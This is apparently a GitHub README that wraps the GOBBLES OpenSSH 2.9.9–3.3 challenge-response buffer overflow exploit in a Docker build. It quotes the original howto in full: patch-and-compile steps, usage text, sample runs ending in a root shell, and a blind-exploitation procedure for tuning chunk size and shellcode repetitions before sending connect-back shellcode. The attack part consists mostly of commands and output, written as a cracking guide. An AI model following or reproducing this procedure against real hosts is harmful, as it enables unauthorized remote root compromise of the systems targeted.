# openssh-3.x-challenge-response-buffer-overflow
SSH binary for exploiting OpenSSH 3.x - Challenge-Response Buffer Overflow

Note: this is an ancient flaw so hopefully you won't find any vulnerable services out there anymore.

More info:

https://www.exploit-db.com/exploits/21578


## Build

You can build it this way:

```
docker build -t openssh3x https://github.com/irsl/openssh-3.x-challenge-response-buffer-overflow.git
```

## Usage

The entry point is the ssh cli, so you can use it this way:

```
docker run --rm -it openssh3x ...ssh parameters...
```

# Exploit how to (from 21579.tar.gz)
```
First, know that OpenBSD 2.9 doesn't have the /etc/login.conf bsdauth styles
listed, nor the required binaries in /usr/libexec/auth -- exploitation
against OpenBSD 2.9 and earlier is unlikely. A default installation of
OpenBSD 3.x, on the other hand, should hand over remote root easily. We
assume privilege separation is not used.

A vulnerable OpenSSH 2.9.9 - 3.3 sshd will have the following configuration:

-- SSH2 support (reported by exploit)
-- Challenge-response authentication enabled (reported by exploit, sort of)
-- SKEY and/or BSDAUTH defined at compile time (reported by exploit)

An OpenBSD 3.x installation out-of-the-box meets the above requirements.

We'll walk you through the exploitation process step-by-step. We at GOBBLES
Security Labs want you to enjoy success in your cracking pursuits.

*** Get the exploit compiled ***

Download the 3.4 portable version of OpenSSH:

ftp://ftp.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-3.4p1.tar.gz

You can use lynx, wget, Netscape, fetch, ... whatever.

bash-2.05a$ tar zxvf openssh-3.4p1.tar.gz
bash-2.05a$ cp ssh.diff openssh-3.4p1
bash-2.05a$ cd openssh-3.4p1
bash-2.05a$ patch < ssh.diff
bash-2.05a$ ./configure
bash-2.05a$ make ssh

Ignore all warnings. They're Theo's, not ours. Theo pretty much wrote our
exploit for us, because all we had to do was tinker with usage() and make a
few cosmetic changes. Thanks, Theo!

*** See if it compiled OK ***

bash-2.05a$ ./ssh
GOBBLES SECURITY - WHITEHATS POSTING TO BUGTRAQ FOR FAME
OpenSSH 2.9.9 - 3.3 remote challenge-response exploit
#1 rule of ``ethical hacking'': drop dead

Usage: ssh [options] host
Options:
***** READ THE HOWTO FILE IN THE TARBALL *****
  -l user     Log in using this user name.
  -p port     Connect to this port.  Server must be on the same port.
  -M method   Select the device (skey or bsdauth)
              default: bsdauth
  -S style    If using bsdauth, select the style
              default: skey
  -d rep      Test shellcode repeat
              default: 10000 (with -z) ; 0 (without -z)
  -j size     Chunk size
              default: 4096 (1 page)
  -r rep      Connect-back shellcode repeat
              default: 60 (not used with -z)
  -z          Enable testing mode
  -v          Verbose; display verbose debugging messages.
              Multiple -v increases verbosity.


*** First try cracking the box with default option values ***

bash-2.05a$ ./ssh -l root [insert host here]
[*] remote host supports ssh2
[*] server_user: root:skey
[*] keyboard-interactive method available
[*] chunk_size: 4096 tcode_rep: 0 scode_rep 60
[*] mode: exploitation
*GOBBLE*
OpenBSD [...] GENERIC#653 i386
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty),
5(operator), 20(staff), 31(guest)

This will probably work fine against most OpenBSD 3.x boxes, but if not,
have no fear!


****************** BLIND EXPLOITATION OF SSHD DAEMON ***************************

1. The output above will tell you if the host supports SSH2.

2a. Determine if S/Key or bsdauth support is available. This can be done with
the -M option. If S/Key is available, the username you use (-l) has to have
an entry in /etc/skeykeys.

2b. If attacking via bsdauth, determine what styles are available. Anything
in /usr/libexec/auth that can issue a challenge and is in /etc/login.conf
will work. The following styles are valid and are all worth trying: skey,
token, activ, crypto, snk. This is what the -S option is for.

The next two examples illustrate how to use the -M and -S options. You'll
observe that the exploit will determine if the device (with style, in the
case of bsdauth) is available.

$ ./ssh -l root openbsd -M skey
[*] remote host supports ssh2
[*] server_user: root
[*] keyboard-interactive method available
[x] skey not available
Permission denied (publickey,password,keyboard-interactive).

$ ./ssh -l root openbsd -M bsdauth -S invalid
[*] remote host supports ssh2
[*] server_user: root:invalid
[*] keyboard-interactive method available
[x] bsdauth (invalid) not available
Permission denied (publickey,password,keyboard-interactive).

3. Enable testing mode with the -z option. This uses a special test
shellcode that will setrlimit(RLIM_CPU, ...); with a 20 second hard limit
and then enter an infinite loop. Without the setrlimit(), there'd be a nasty
hang on a lot of boxes. The purpose of this shellcode is to let you know
that the packet_close() cleanup function pointer (see DETAILS) has been
overwritten. You'll know this because the client will seem to hang much
longer than it would on a failed exploitation attempt. The default number of
repetitions for this shellcode is 10,000. This appears to be optimal and
ensures that for each chunk size tried (see step 4) you'll know it's either
a valid chunk size or not, because if it's valid, the function pointer will
most definitely be overwritten.

4. Try chunk sizes using powers of 2 commencing at 4096 and working down to
16. That is, 4096, 2048, 1024, 512, 256, 128, 64, 32, 16. This is specified
with the -j option.

So, using the correct -M and -S (if needed) options, you add -z to the
command line and work down with -j as described above:

./ssh -l root openbsd_box -M bsdauth -S skey -z -j 4096
./ssh -l root openbsd_box -M bsdauth -S skey -z -j 2048
./ssh -l root openbsd_box -M bsdauth -S skey -z -j 1024

... and so on.

You'll know you've found the right chunk size when the client seems to hang
for around 20 seconds longer than a failed exploitation (of course, you must
factor in bandwidth issues and realize that 10,000 test shellcode
repetitions are sent by default).

5. Now using the right chunk size (-j option), you can begin using the -d
option to decrease the number of test shellcode repetitions from the default
10,000. We recommend a sort of binary search procedure. For instance:

	Does 5,000 hang? If so, try 2,500. If not, try 7,500.

It should be clear what kind of pattern to follow. You can narrow it right
down to the border where X repetitions does not hang, but X+1 repetitions
does hang, if you're so inclined. It's good to get it down to within a margin
of 50 or so between "does not hang" and "hangs".

		no hang			hang
	[			][/////////////////----->]
                  |              |
-d              3200             3250


./ssh -l root openbsd_box -M bsdauth -S skey -z -j from_step_4 -d 3250
./ssh -l root openbsd_box -M bsdauth -S skey -z -j from_step_4 -d 3200

What's really going on here is that we're trying to reduce the test
shellcode repetitions so that the function pointer is not overwritten, but
so that it "almost is". This is so the real shellcode can be sent in step 6
(which is considerably larger) with a small number of repetitions and
hopefully hit home, causing the GOBBLES SECURITY LABS connect-back shellcode
to be executed, bypassing a lot of firewall rulesets.

6. With the right value for -d, you can now remove the -z option from the
command line and start using the -r option to control the real shellcode
repetition count. If you followed the advice in step 5, the default value of
60 should work fine for you. Otherwise play around with it.

# -z removed
./ssh -l root openbsd_box -M bsdauth -S skey -j from_step_4 -d 3200
./ssh -l root openbsd_box -M bsdauth -S skey -j from_step_4 -d 3200 -r 100
```



